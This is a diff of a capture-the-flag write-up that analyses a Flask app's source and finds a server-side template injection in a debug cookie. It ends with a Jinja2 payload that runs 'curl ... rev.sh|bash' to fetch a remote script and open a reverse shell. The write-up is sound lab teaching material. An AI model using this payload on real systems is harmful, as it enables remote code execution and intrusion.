@@ -62,6 +62,7 @@ Trying that works
 Let's say you don't know the file name we can also fuzz it using `ffuf`
 
 This is how to do it
+
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1a71b06a-e073-4c00-8777-1d0a52a9a4b9)
 
 Save the request to a file and run this
@@ -75,6 +76,7 @@ With that let's view the app source code
 I'll view each routes / function and explain what it does
 
 The function `illegal_chars_check()`:
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8ed90ac8-3eb8-4c2e-aa75-f0e4e3827e63)
 
 ```python
 def illegal_chars_check(input):
@@ -90,6 +92,7 @@ def illegal_chars_check(input):
 It makes sure that the input which is the parameter passed when this function is called doesn't contain any illegal character which are: `{"'", "&", ";", "%"}`
 
 The function `download()`:
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/62095404-6fd1-49c5-96fa-fbf58fcf5db2)
 
 ```python
 @app.route("/cloud", methods=["GET", "POST"]) 
@@ -121,6 +124,7 @@ But if the file extension ends with `.txt` it will send the file name as an atta
 Else it will just give the return the file 
 
 The function `debug()`:
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d43b1d70-fb6b-4e10-8d36-d4b225992e7e)
 
 ```python
 @app.route("/debug", methods=["GET"]) 
@@ -172,6 +176,7 @@ Then it returns the success message
 At this point what we obviously want is a way to get the password
 
 Looking at the first portion of the code shows some interesting imports
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/70ce4c96-c865-4e5a-a966-94c6155c9c08)
 
 ```python
 from flask import *
@@ -244,7 +249,69 @@ b'AyhamDeebugg'
 
 So the expected password is `AyhamDeebugg`
 
+Let's continue viewing the other functions
 
+The function `debugResult()`:
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff72e845-fd3f-4d4d-9590-c4ed19ca78b0)
 
+```python
+@app.route("/debugresult", methods=["GET"]) 
+def debugResult():
+    if not ip.checkIP(request):
+        return abort(401, "Everything made in home, we don't like intruders.")
+    
+    if not session:
+        return render_template("debugresult.html")
+    
+    debug = session.get('debug')
+    result, error = illegal_chars_check(debug)
+    if result is True:
+        return render_template("debugresult.html", error=error)
+    user_password = session.get('password')
+    
+    if not debug and not user_password:
+        return render_template("debugresult.html")
+        
+    # return render_template("debugresult.html", debug=debug, success=True)
+    
+    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
+    template = open('./templates/debugresult.html').read()
+    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
+```
 
+Ok first this makes sure the `X-Forwarded-For` header is `127.0.0.1`
+
+Then it checks if there's a session cookie if there isn't it renders the `debugresult.html` file
+
+The debug variable is set to the value of our `session['debug']` cookie
+
+It makes the debug variable doesn't contain any illegal characters
+
+It also tends to store the `session['password']` cookie value to the `user_password` variable
+
+Then it checks if both variable i.e `debug & user_password` contains a value and if it doesn't it renders the `debugresult.html` file
+
+The at the end it will render our `debug` input as a template which here causes a template injection
+
+So the vulnerability here is Server Side Template Injection (SSTI)
+
+And our injection point is the `debug` parameter
+
+To test it let's confirm it using `{{7*7}}`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4ce0219f-c4f3-47dd-80aa-586fb32aa722)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57dbafc1-7246-498e-b716-fa19d6f82db9)
+
+Cool it works
+
+Time for a reverse shell 
+
+I grabbed a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread)
+
+With a little modification i.e changing single quote to double quote due to the character filter, here's the payload
+
+```r
+{{ self.__init__.__globals__.__builtins__.__import__("os").popen("curl 10.6.80.113/rev.sh|bash").read() }}
+```
+
+Using that worked
 
